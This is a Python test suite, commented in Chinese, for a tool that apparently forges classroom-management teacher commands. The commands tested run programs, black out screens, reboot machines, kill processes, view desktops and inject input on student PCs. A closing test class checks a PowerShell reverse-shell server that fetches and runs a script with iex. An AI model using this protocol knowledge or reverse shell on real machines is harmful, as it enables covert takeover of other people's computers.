"""应用命令与教师端会话的离线测试：报文拼接、解析与命令行参数。"""

import socket
import struct
import unittest
import unittest.mock
from threading import Event
from unittest.mock import patch

from app import core
from app.cli import main as cli
from app.core import appcmd

# JPEG 的起始标记，测试里用来确认记录里保留了原始图片数据。
JPEG_SOI = bytes([0xFF, 0xD8])


def lant_fragment(frame, total, offset, payload):
    """拼一个 LANT 缩略图分片：4 字节魔数 + 28 字节保留 + 16 字节字段。"""
    return (
        struct.pack("<I", appcmd.LANT_MAGIC)
        + bytes(28)
        + struct.pack("<IIII", frame, total, offset, len(payload))
        + payload
    )


def build_message(host, payload):
    """拼一条完整的 MESS 报文，供解析测试复用。"""
    return (
        struct.pack("<III", core.appcmd.MESS_MAGIC, 1, 1)
        + socket.inet_aton(host)
        + payload
    )


class AppCommandTests(unittest.TestCase):
    """逐字节校验应用命令与会话报文的布局。"""

    def setUp(self):
        self.appcmd = core.appcmd

    def test_session_endpoint_matches_channel_formula(self):
        self.assertEqual(self.appcmd.session_endpoint(1), ("225.2.2.1", 5512))
        self.assertEqual(self.appcmd.session_endpoint(2), ("225.2.3.1", 6024))
        with self.assertRaises(ValueError):
            self.appcmd.session_endpoint(0)
        with self.assertRaises(ValueError):
            self.appcmd.session_endpoint(33)

    def test_announce_packets_carry_magic_length_and_address(self):
        oonc = self.appcmd.oonc_packet("10.0.0.2", sequence=7)
        magic, version, length = struct.unpack("<III", oonc[:12])
        self.assertEqual(magic, self.appcmd.OONC_MAGIC)
        self.assertEqual(version, self.appcmd.COM_VERSION)
        self.assertEqual(length, 16)
        self.assertEqual(oonc[28:32], socket.inet_aton("10.0.0.2"))
        self.assertEqual(struct.unpack("<III", oonc[32:44]), (1, 1, 7))

        nanc = self.appcmd.nanc_packet("10.0.0.2", channel=3, teacher_name="教师")
        magic, _version, length = struct.unpack("<III", nanc[:12])
        self.assertEqual(magic, self.appcmd.NANC_MAGIC)
        self.assertEqual(length, len(nanc) - 28)
        self.assertEqual(nanc[32:36], socket.inet_aton("10.0.0.2"))

    def test_canc_rejects_overlong_teacher_name(self):
        with self.assertRaises(ValueError):
            self.appcmd.canc_packet("10.0.0.2", teacher_name="名" * 40)
        packet = self.appcmd.canc_packet("10.0.0.2", teacher_name="1")
        self.assertEqual(len(packet), 28 + 84)

    def test_run_program_payload_has_fixed_size_fields(self):
        payload = self.appcmd.run_program_payload(
            "C:/Windows/notepad.exe", "-n", show=2
        )
        self.assertEqual(struct.unpack("<I", payload[:4])[0], self.appcmd.APP_CATEGORY)
        self.assertEqual(struct.unpack("<I", payload[4:8])[0], 0)
        self.assertEqual(struct.unpack("<I", payload[8:12])[0], self.appcmd.CMD_RUN)
        self.assertEqual(struct.unpack("<I", payload[12:16])[0], 1)
        self.assertEqual(struct.unpack("<I", payload[-8:-4])[0], 2)
        packet = self.appcmd.comd_packet(payload)
        self.assertEqual(struct.unpack("<I", packet[:4])[0], self.appcmd.COM_MAGIC)
        self.assertEqual(struct.unpack("<I", packet[8:12])[0], len(packet) - 28)

    def test_open_url_payload_appends_terminator_and_padding(self):
        payload = self.appcmd.open_url_payload("http://10.0.0.1")
        self.assertEqual(
            struct.unpack("<I", payload[8:12])[0], self.appcmd.CMD_OPEN_URL
        )
        self.assertTrue(payload.endswith(b"\x00" * 6))
        self.assertIn("http://10.0.0.1".encode("utf-16-le"), payload)

    def test_blackscreen_mess_payload_layout(self):
        payload = self.appcmd.blackscreen_mess_payload(True, 30)
        self.assertEqual(struct.unpack("<I", payload[:4])[0], len(payload))
        self.assertEqual(struct.unpack("<I", payload[4:8])[0], 0x20)
        self.assertEqual(struct.unpack("<I", payload[8:12])[0], 0x80000000)
        self.assertEqual(struct.unpack("<I", payload[12:16])[0], 1)
        self.assertEqual(struct.unpack("<I", payload[20:24])[0], 30)
        self.assertEqual(payload[36:39], b"\xa0\x05\x20")

    def test_blackscreen_payload_uses_case_six(self):
        payload = self.appcmd.blackscreen_payload(True, 15)
        self.assertEqual(
            struct.unpack("<I", payload[8:12])[0], self.appcmd.CMD_BLACKSCREEN
        )
        self.assertEqual(struct.unpack("<I", payload[12:16])[0], 1)
        self.assertEqual(struct.unpack("<I", payload[20:24])[0], 15)

    def test_unlock_payload_clears_blackscreen_flag(self):
        payload = self.appcmd.unlock_payload()
        self.assertEqual(struct.unpack("<I", payload[:4])[0], 0x0D)
        self.assertEqual(struct.unpack("<I", payload[4:8])[0], 0x20)
        self.assertEqual(struct.unpack("<I", payload[8:12])[0], 0x90000000)
        self.assertEqual(payload[12:], b"\x01")

    def test_power_payload_carries_delay_and_text(self):
        payload = self.appcmd.power_payload(reboot=True, delay=5, text="即将重启")
        command = struct.unpack("<I", payload[8:12])[0]
        self.assertEqual(command, self.appcmd.CMD_REBOOT | self.appcmd.CMD_FORCE)
        self.assertEqual(struct.unpack("<I", payload[12:16])[0], 5)
        self.assertIn("即将重启".encode("utf-16-le"), payload)

    def test_kill_payload_requires_identifier(self):
        with self.assertRaises(ValueError):
            self.appcmd.kill_payload()
        by_process = self.appcmd.kill_payload(process_id=4321)
        self.assertEqual(struct.unpack("<I", by_process[12:16])[0], 4)
        self.assertEqual(struct.unpack("<I", by_process[20:24])[0], 4321)
        by_window = self.appcmd.kill_payload(window=99, force=False)
        self.assertEqual(struct.unpack("<I", by_window[12:16])[0], 3)
        self.assertEqual(struct.unpack("<I", by_window[16:20])[0], 99)
        self.assertEqual(struct.unpack("<I", by_window[24:28])[0], 0)

    def test_info_request_payload_carries_report_kind(self):
        payload = self.appcmd.info_request_payload(self.appcmd.REPORT_PROCESSES)
        self.assertEqual(struct.unpack("<I", payload[:4])[0], 16)
        self.assertEqual(
            struct.unpack("<I", payload[4:8])[0], self.appcmd.INFO_REQUEST_CODE
        )
        self.assertEqual(struct.unpack("<I", payload[12:16])[0], 2)

    def test_session_replies_include_tcp_port(self):
        packets = self.appcmd.session_replies("10.0.0.9")
        self.assertEqual(len(packets), 2)
        for packet in packets:
            self.assertEqual(struct.unpack("<I", packet[:4])[0], self.appcmd.MESS_MAGIC)
            self.assertEqual(packet[12:16], socket.inet_aton("10.0.0.9"))
        self.assertEqual(
            struct.unpack("<H", packets[1][32:34])[0], self.appcmd.TCP_COMM_PORT
        )

    def test_thumbnail_packets_use_policy_subtypes(self):
        packets = self.appcmd.thumbnail_packets()
        self.assertEqual(len(packets), 2)
        self.assertEqual(struct.unpack("<I", packets[0][:4])[0], self.appcmd.LPNT_MAGIC)
        self.assertEqual(struct.unpack("<I", packets[0][28:32])[0], 2)
        self.assertEqual(struct.unpack("<I", packets[1][28:32])[0], 3)
        self.assertEqual(len(packets[0]), 48)

    def test_parse_student_info_reads_fixed_offsets(self):
        payload = bytearray(0x2DA + 32)
        struct.pack_into("<I", payload, 0, 5)
        payload[0x10 : 0x10 + 10] = "PC-01".encode("utf-16-le")
        struct.pack_into("<I", payload, 0x50, 20260001)
        payload[0x54:0x5A] = bytes.fromhex("001122334455")
        payload[0x5A : 0x5A + 6] = "学生".encode("utf-16-le")
        payload[0x9A : 0x9A + 20] = "Windows 11".encode("utf-16-le")
        payload[0xDA : 0xDA + 10] = "10.0.22631".encode("utf-16-le")
        payload[0x21A : 0x21A + 8] = "Genuine".encode("utf-16-le")
        payload[0x25A : 0x25A + 10] = "i7-12700".encode("utf-16-le")
        payload[0x2DA : 0x2DA + 16] = "16384 MB".encode("utf-16-le")
        info = self.appcmd.parse_student_info(bytes(payload))
        self.assertEqual(info["name"], "PC-01")
        self.assertEqual(info["student_id"], 20260001)
        self.assertEqual(info["mac"], "00-11-22-33-44-55")
        self.assertEqual(info["user"], "学生")
        self.assertEqual(info["os"], "Windows 11")
        self.assertEqual(info["os_version"], "10.0.22631")
        self.assertEqual(info["cpu_model"], "i7-12700")
        self.assertEqual(info["memory"], "16384 MB")
        with self.assertRaises(ValueError):
            self.appcmd.parse_student_info(b"\x00" * 16)

    def test_parse_id_name_pairs_stops_at_truncation(self):
        data = struct.pack("<I", 101) + "notepad.exe".encode("utf-16-le") + b"\x00\x00"
        data += struct.pack("<I", 202) + "记事本".encode("utf-16-le") + b"\x00\x00"
        self.assertEqual(
            self.appcmd.parse_id_name_pairs(data),
            [(101, "notepad.exe"), (202, "记事本")],
        )
        self.assertEqual(self.appcmd.parse_id_name_pairs(b"\x01\x02"), [])

    def test_parse_message_detects_kinds(self):
        chat = build_message(
            "10.0.0.9",
            struct.pack("<IIII", 0, self.appcmd.MESS_CHAT_TYPE, 0, 0)
            + "你好".encode("utf-16-le"),
        )
        self.assertEqual(self.appcmd.parse_message(chat)["kind"], "chat")
        windows = build_message(
            "10.0.0.9",
            struct.pack("<IIIII", 0, 0x100000, self.appcmd.INFO_REPORT_CATEGORY, 6, 1)
            + struct.pack("<I", 7)
            + "窗口".encode("utf-16-le")
            + b"\x00\x00",
        )
        parsed = self.appcmd.parse_message(windows)
        self.assertEqual(parsed["kind"], "windows")
        self.assertTrue(parsed["first"])
        self.assertEqual(parsed["entries"], [(7, "窗口")])
        with self.assertRaises(ValueError):
            self.appcmd.parse_message(b"\x00\x00")

    def test_looks_like_login_checks_magic(self):
        login = struct.pack("<I", self.appcmd.LOGI_MAGIC) + b"\x00" * 8
        self.assertTrue(self.appcmd.looks_like_login(login))
        self.assertFalse(self.appcmd.looks_like_login(b"\x00\x00\x00\x00"))


class TeacherSessionTests(unittest.TestCase):
    """教师端命令分派的离线测试，全程替换套接字发送函数。"""

    def test_run_app_operation_reports_sent_bytes(self):
        with patch.object(core.teacher, "send_app_command", return_value=10) as send:
            result = core.run_app_operation(
                ["10.0.0.1", "10.0.0.2"], b"payload", channel="comd"
            )
        self.assertEqual(result, {"sent": 20, "hosts": 2})
        self.assertEqual(send.call_count, 2)

    def test_run_app_operation_supports_lock_payload(self):
        with (
            patch.object(core.teacher, "send_app_command", return_value=4) as send,
            patch.object(core.teacher, "send_session_broadcast", return_value=6),
        ):
            result = core.run_app_operation(
                ["10.0.0.1"], b"black", channel="session", lock_payload=b"lock"
            )
        self.assertEqual(result["sent"], 10)
        self.assertEqual(send.call_count, 1)
        self.assertEqual(send.call_args.args[1], b"lock")

    def test_run_app_operation_honours_cancel(self):
        cancel_event = Event()
        cancel_event.set()
        with (
            patch.object(core.teacher, "send_app_command", return_value=1),
            self.assertRaises(RuntimeError),
        ):
            core.run_app_operation(["10.0.0.1"], b"x", cancel_event=cancel_event)

    def test_session_broadcast_requires_targets(self):
        with self.assertRaises(ValueError):
            core.send_session_broadcast([], b"x")


class AppCommandCliTests(unittest.TestCase):
    """应用命令相关命令行参数的解析与负载生成。"""

    def parse(self, *arguments):
        return cli.build_parser().parse_args(["-ip", "10.0.0.1", *arguments])

    def test_action_arguments_are_mutually_exclusive(self):
        with self.assertRaises(SystemExit):
            self.parse("--run", "a.exe", "--url", "http://x")

    def test_run_action_builds_comd_payload(self):
        name, payload, channel, lock = cli.build_action_payload(
            self.parse("--run", "a.exe", "--run-args=-n")
        )
        self.assertEqual(name, "远程运行程序")
        self.assertEqual(channel, "comd")
        self.assertIsNone(lock)
        self.assertEqual(struct.unpack("<I", payload[8:12])[0], core.appcmd.CMD_RUN)

    def test_url_action_adds_scheme(self):
        _name, payload, channel, _lock = cli.build_action_payload(
            self.parse("--url", "example.com")
        )
        self.assertEqual(channel, "comd")
        self.assertIn("http://example.com".encode("utf-16-le"), payload)

    def test_kill_action_uses_mess_channel(self):
        _name, payload, channel, _lock = cli.build_action_payload(
            self.parse("--kill", "42")
        )
        self.assertEqual(channel, "mess")
        self.assertEqual(struct.unpack("<I", payload[12:16])[0], 4)

    def test_blackscreen_action_uses_session_channel_and_lock(self):
        name, payload, channel, lock = cli.build_action_payload(
            self.parse("--blackscreen", "20")
        )
        self.assertEqual(name, "黑屏并锁定键鼠")
        self.assertEqual(channel, "session")
        self.assertIsNotNone(lock)
        self.assertEqual(struct.unpack("<I", payload[20:24])[0], 20)
        _name, _payload, channel, lock = cli.build_action_payload(
            self.parse("--blackscreen", "20", "--no-lock")
        )
        self.assertEqual(channel, "session")
        self.assertIsNone(lock)

    def test_defaults_when_no_action_given(self):
        arguments = self.parse()
        self.assertIsNone(cli.build_action_payload(arguments))
        self.assertEqual(arguments.channel, 1)
        self.assertEqual(arguments.teacher_name, "1")

    def test_announce_and_students_defaults(self):
        self.assertEqual(self.parse("--announce").announce, 10)
        self.assertEqual(self.parse("--students").students, 8)


class ScreenProtocolTests(unittest.TestCase):
    """屏幕观看相关报文的逐字节测试。"""

    def test_srnt_packet_requests_whole_frame(self):
        packet = appcmd.srnt_packet(7)
        self.assertEqual(len(packet), 42)
        self.assertEqual(struct.unpack_from("<I", packet, 0)[0], appcmd.SRNT_MAGIC)
        self.assertEqual(struct.unpack_from("<I", packet, 28)[0], 7)

    def test_srnt_packet_lists_missing_parts(self):
        packet = appcmd.srnt_packet(3, complete=False, missing_parts=[1, 2])
        body = struct.unpack_from("<III", packet, 28)
        self.assertEqual(body[0], 3)
        self.assertEqual(body[1], 0)
        self.assertEqual(body[2], 2)
        self.assertEqual(struct.unpack_from("<2H", packet, 40), (1, 2))

    def test_preview_assembler_waits_for_all_fragments(self):
        assembler = appcmd.PreviewAssembler()
        total = 6
        first = lant_fragment(1, total, 0, b"abc")
        second = lant_fragment(1, total, 3, b"def")
        self.assertIsNone(assembler.feed(first))
        self.assertEqual(assembler.feed(second), b"abcdef")

    def test_preview_assembler_reports_missing_parts(self):
        assembler = appcmd.PreviewAssembler()
        total = 2048
        data = lant_fragment(5, total, 0, bytes(1024))
        assembler.feed(data)
        self.assertEqual(assembler.missing_parts(5), [1])
        self.assertIsNone(assembler.missing_parts(6))

    def test_dent_frame_sequence_reads_offset(self):
        data = bytes(36) + struct.pack("<I", 9)
        self.assertEqual(appcmd.dent_frame_sequence(data), 9)

    def test_screen_payloads_match_declared_lengths(self):
        start = appcmd.screen_start_payload("10.1.1.5", 5512, 5512)
        self.assertEqual(len(start), 617)
        self.assertEqual(struct.unpack_from("<III", start, 0), (617, 8, 0x80000000))
        self.assertEqual(len(appcmd.screen_stop_payload()), 13)

    def test_umsp_hello_subscribes_desktop_channel(self):
        hello = appcmd.umsp_hello_payload()
        self.assertEqual(len(hello), 20)
        self.assertEqual(
            struct.unpack_from("<I", hello, 4)[0], appcmd.UMSP_SELECT_MAGIC
        )
        self.assertEqual(struct.unpack_from("<I", hello, 16)[0], 10)

    def test_parse_umsp_header_rejects_other_versions(self):
        body = struct.pack("<III", 0x00020000, 1, 0)
        with self.assertRaises(ValueError):
            appcmd.parse_umsp_header(body)

    def test_parse_desktop_record_recognises_jpeg_and_cursor(self):
        payload = JPEG_SOI + b"frame"
        record = (
            struct.pack("<III", appcmd.DESKTOP_JPEG_MAGIC, 0, 1)
            + struct.pack("<iiii", 0, 0, 100, 50)
            + struct.pack("<iiii", 0, 0, 100, 50)
            + struct.pack("<I", 1)
            + bytes(16)
            + payload
        )
        parsed = appcmd.parse_desktop_record(record)
        self.assertEqual(parsed["kind"], "jpeg")
        self.assertTrue(parsed["payload"].startswith(JPEG_SOI))
        cursor = b"SPUC" + struct.pack("<III", 8, 2, (30 << 16) | 10)
        self.assertEqual(appcmd.parse_desktop_record(cursor)["x"], 10)

    def test_remote_control_payload_keeps_target_and_mode(self):
        payload = appcmd.remote_control_payload_for("10.1.1.5", 2, 4806)
        self.assertEqual(len(payload), 53)
        self.assertEqual(payload[12:16], b"MCMD")
        self.assertEqual(struct.unpack_from("<I", payload, 16)[0], 2)
        self.assertEqual(socket.inet_ntoa(payload[20:24]), "10.1.1.5")
        self.assertEqual(struct.unpack_from("<H", payload, 24)[0], 4806)

    def test_command_transaction_wraps_mcmd(self):
        payload = appcmd.remote_control_payload(2, 4806)
        packet = appcmd.command_transaction_packet(payload, "10.1.1.5")
        self.assertEqual(len(packet), len(payload) + 41)
        self.assertEqual(struct.unpack_from("<I", packet, 0)[0], appcmd.COM_MAGIC)

    def test_mouse_and_key_input_round_trip(self):
        mouse = appcmd.mouse_input_payload("leftdown", 100, 200)
        self.assertEqual(struct.unpack_from("<I", mouse, 0)[0], 0x0201)
        packet = appcmd.input_packet(1, mouse)
        self.assertEqual(struct.unpack_from("<II", packet, 0), (appcmd.INPUT_MAGIC, 1))
        key = appcmd.key_input_payload(0x1E, 0x41, key_up=True, extended=False)
        self.assertEqual(len(key), 20)
        self.assertEqual(struct.unpack_from("<I", key, 4)[0], 0x80)
        with self.assertRaises(ValueError):
            appcmd.input_packet(1, b"short")


class ScreenSessionTests(unittest.TestCase):
    """屏幕会话的分片重组与记录回调。"""

    def make_session(self):
        records = []
        session = core.screen.ScreenSession(
            "10.1.1.5", on_record=records.append, on_log=lambda _message: None
        )
        return session, records

    def feed_fragment(self, session, frame, offset, total, fragment):
        session._handle_fragment(struct.pack("<III", frame, offset, total) + fragment)

    def test_fragments_reassemble_into_record(self):
        session, records = self.make_session()
        body = (
            struct.pack("<III", appcmd.DESKTOP_JPEG_MAGIC, 0, 1)
            + struct.pack("<iiii", 0, 0, 64, 32)
            + struct.pack("<iiii", 0, 0, 64, 32)
            + struct.pack("<I", 1)
            + bytes(16)
            + JPEG_SOI
            + b"body"
        )
        half = len(body) // 2
        self.feed_fragment(session, 1, 0, len(body), body[:half])
        self.assertEqual(records, [])
        self.feed_fragment(session, 1, half, len(body), body[half:])
        self.assertEqual(len(records), 1)
        self.assertEqual(records[0]["kind"], "jpeg")

    def test_duplicate_fragment_does_not_double_count(self):
        session, records = self.make_session()
        body = (
            struct.pack("<III", appcmd.DESKTOP_JPEG_MAGIC, 0, 1)
            + struct.pack("<iiii", 0, 0, 8, 8)
            + struct.pack("<iiii", 0, 0, 8, 8)
            + struct.pack("<I", 1)
            + bytes(16)
            + JPEG_SOI
            + b"xy"
        )
        self.feed_fragment(session, 2, 0, len(body), body)
        self.feed_fragment(session, 2, 0, len(body), body)
        self.assertEqual(len(records), 1)


class RemoteControlTests(unittest.TestCase):
    """远控通道：接管请求与输入报文的发送。"""

    def make_control(self):
        control = core.RemoteControl("10.1.1.5", "10.1.1.9", mode=2, udp_port=4705)
        control._sock = unittest.mock.Mock()
        control._ready_at = 0.0
        return control

    def test_open_sends_transaction_and_keeps_port(self):
        control = core.RemoteControl("10.1.1.5", "10.1.1.9", udp_port=4705)
        with unittest.mock.patch("socket.socket") as factory:
            factory.return_value.getsockname.return_value = ("10.1.1.9", 55120)
            port = control.open()
            self.assertEqual(port, 55120)
            self.assertEqual(control.port, 55120)
            sent = factory.return_value.sendto
            self.assertEqual(sent.call_args.args[1], ("10.1.1.5", 4705))
        control.close(send_stop=False)

    def test_mouse_and_key_build_input_packets(self):
        control = self.make_control()
        control.mouse("leftdown", 100, 200)
        control.key(0x1E, 0x41, key_up=True)
        calls = control._sock.sendto.call_args_list
        self.assertEqual(len(calls), 2)
        self.assertEqual(
            struct.unpack_from("<II", calls[0].args[0], 0), (appcmd.INPUT_MAGIC, 1)
        )
        self.assertEqual(struct.unpack_from("<I", calls[0].args[0], 8)[0], 0x0201)
        self.assertEqual(
            struct.unpack_from("<II", calls[1].args[0], 0), (appcmd.INPUT_MAGIC, 16)
        )
        self.assertEqual(calls[0].args[1], ("10.1.1.5", 0))

    def test_send_requires_open(self):
        control = core.RemoteControl("10.1.1.5", "10.1.1.9")
        with self.assertRaises(RuntimeError):
            control.mouse("move", 1, 1)

    def test_close_stops_and_releases_socket(self):
        control = self.make_control()
        socket_mock = control._sock
        control.close()
        socket_mock.close.assert_called_once_with()
        self.assertIsNone(control._sock)


if __name__ == "__main__":
    unittest.main()


class ChatAndWindowTests(unittest.TestCase):
    """聊天消息、按窗口关闭、宣告多目标与端口探测。"""

    def test_chat_payload_frames_utf16_text(self):
        payload = appcmd.chat_payload("你好")
        total, kind, reserved, units = struct.unpack_from("<IIII", payload, 0)
        self.assertEqual(total, len(payload))
        self.assertEqual(kind, 0x800)
        self.assertEqual(reserved, 0)
        # 第 4 个字段是 UTF-16 码元数，含结尾空字符，否则学生端只显示第一个字。
        self.assertEqual(units, 3)
        self.assertEqual(payload[16:], "你好".encode("utf-16-le") + b"\x00\x00")

    def test_chat_payload_rejects_empty_text(self):
        with self.assertRaises(ValueError):
            appcmd.chat_payload("")
        with self.assertRaises(ValueError):
            appcmd.chat_payload("a\x00b")

    def test_announce_targets_covers_broadcast_and_peers(self):
        with patch.object(
            core.teacher, "local_networks", return_value=[("192.168.50.22", 24)]
        ):
            targets = core.announce_targets(
                "192.168.50.22", "224.0.0.1", 4705, ["10.0.0.9"]
            )
        self.assertIn(("224.0.0.1", 4705), targets)
        self.assertIn(("192.168.50.255", 4705), targets)
        self.assertIn(("192.168.50.1", 4705), targets)
        self.assertIn(("10.0.0.9", 4705), targets)
        # 本机地址不往自己身上发宣告。
        self.assertNotIn(("192.168.50.22", 4705), targets)

    def test_announce_targets_deduplicates_peers(self):
        with patch.object(
            core.teacher, "local_networks", return_value=[("192.168.50.22", 24)]
        ):
            targets = core.announce_targets(
                "192.168.50.22", "224.0.0.1", 4705, ["224.0.0.1", "10.0.0.9"]
            )
        self.assertEqual(len(targets), len(set(targets)))

    def test_probe_detects_open_and_closed_ports(self):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.bind(("127.0.0.1", 0))
        listener.listen(1)
        port = listener.getsockname()[1]
        try:
            reachable, _detail = core.probe("127.0.0.1", port, timeout=1.0)
        finally:
            listener.close()
        self.assertTrue(reachable)
        closed, detail = core.probe("127.0.0.1", port, timeout=0.5)
        self.assertFalse(closed)
        self.assertTrue(detail)

    def test_chat_and_close_require_targets(self):
        with self.assertRaises(ValueError):
            core.send_chat([], "hi")
        with self.assertRaises(ValueError):
            core.close_window([], 0x120A3C)


class ShellServerTests(unittest.TestCase):
    """反弹终端的监听、脚本服务与命令长度。"""

    def test_command_stays_within_channel_capacity(self):
        server = core.ShellServer(bind_ip="127.0.0.1", local_ip="127.0.0.1")
        self.addCleanup(server.close)
        server.start()
        self.assertGreater(server.port, 0)
        self.assertGreater(server.http_port, 0)
        command = server.command()
        self.assertLessEqual(len(command), core.shell.MAX_COMMAND_CHARS)
        self.assertIn(
            "http://127.0.0.1:%d/s.ps1" % server.http_port,
            command,
        )
        script = server.script()
        self.assertIn("TCPClient('127.0.0.1',%d)" % server.port, script)
        self.assertIn("iex", script)

    def test_command_requires_running_server(self):
        with self.assertRaises(ValueError):
            core.ShellServer(local_ip="127.0.0.1").command()

    def test_send_without_connection_returns_false(self):
        server = core.ShellServer(bind_ip="127.0.0.1", local_ip="127.0.0.1")
        self.addCleanup(server.close)
        server.start()
        self.assertFalse(server.send("whoami"))
        self.assertFalse(server.connected)
